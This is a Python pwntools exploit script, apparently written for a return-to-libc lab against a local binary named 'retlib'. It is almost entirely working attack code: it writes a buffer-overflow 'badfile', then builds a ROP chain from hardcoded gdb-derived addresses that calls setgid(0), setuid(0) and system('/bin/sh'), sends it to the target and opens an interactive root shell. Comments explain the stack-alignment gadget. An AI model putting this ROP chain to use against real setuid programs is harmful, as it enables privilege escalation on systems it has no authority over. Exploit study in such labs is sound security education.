from pwn import *
import os
CORE_LOC="/var/lib/apport/coredump"


# generate badfile
payload = cyclic(300, n=8)
pattern=b'aaaaeaaa' #from gdb
ra_offset = cyclic_find(pattern, n=8)
payload=b''
gets= p64(0x7ffff7e3a970)
if(len(payload) < ra_offset):
    payload +=b'|'*(ra_offset-len(payload))
payload+=gets
with open("badfile", "wb") as f:
    f.write(payload)
print(payload)
print("len payload: %d" % len(payload))

elf = context.binary = ELF('./retlib')
#target = process('./retlib2', stdin=PTY)
target = process(stdin=PTY)
#gdb.attach(target, gdbscript='b *bof+96\nset $rip=$rip+0x4')

ra_addr=p64(0x7fffffffe848)
# from gdb
#system=p64(0x7ffff7dfe2c0)
system=p64(0x7ffff7e09290)
#bin_sh_addr=p64(0x7ffff7f605bd)
bin_sh_addr=p64(0x7ffff7f6b5bd)
pop_rdi_ret_gadget=p64(0x555555555363)
ret_gadget=p64(0x555555555364)
exit=p64(0x7ffff7dfda40)
setuid=p64(0x7ffff7e9b150)
setgid=p64(0x7ffff7e9b1f0)

# we need a ret gadget to make the stack
# 16 byte aligned
# the is a movaps instruction inside system
# that fails if the stack is not 16 byte aligned
# at the time it's executed

## so gadget sequence is
# ret
# pop 0 into rdi, call setuid
# pop /bin/sh addr into rdi, call system
# pop 0 into rdi, call exit
payload=b''
gets_offset=4 #from gets payload overflow
if(len(payload) < gets_offset):
    payload +=b'|'*(gets_offset-len(payload))
#payload+=ret_gadget
payload+=pop_rdi_ret_gadget
payload+=p64(0)
payload+=setgid
payload+=pop_rdi_ret_gadget
payload+=p64(0)
payload+=setuid
payload+=pop_rdi_ret_gadget
payload+=bin_sh_addr
payload+=system
payload+=pop_rdi_ret_gadget
payload+=p64(0)
payload+=exit
payload+=b'\n'


# Send the payload
target.sendline(payload)
target.interactive()


# write gets_payload
with open("gets_payload", "wb") as f:
    f.write(payload)
